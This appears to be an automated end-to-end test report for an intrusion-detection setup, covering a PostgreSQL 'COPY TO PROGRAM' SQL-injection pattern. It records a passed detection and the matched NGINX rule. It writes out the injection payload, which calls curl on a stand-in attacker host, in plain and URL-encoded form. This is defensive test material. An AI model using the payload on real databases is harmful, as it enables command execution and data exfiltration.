name: test_e2e_with_logs[083_SQLI_OOB_003]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_OOB_003` |
| **Name** | PostgreSQL COPY TO PROGRAM |
| **Category** | SQLI |
| **Subcategory** | out_of_band |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com'--`
- **Encoded**: `'%3B%20COPY%20(SELECT%20version())%20TO%20PROGRAM%20'curl%20http%3A%2F%2Fattacker.com'--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 20:37:44.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_OOB_003-1770842264622-jixsfl pattern_id=SQLI_OOB_003 uri=/?q='%3B%20COPY%20(SELECT%20version())%20TO%20PROGRAM%20'curl%20http%3A%2F%2Fattacker.com'-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_OOB_003-1770842264622-jixsfl pattern_id=SQLI_OOB_003 uri=/?q='%3B%20COPY%20(SELECT%20version())%20TO%20PROGRAM%20'curl%20http%3A%2F%2Fattacker.com'-- client=127.0.0.1 method=GET

**Falco Log Entry**:
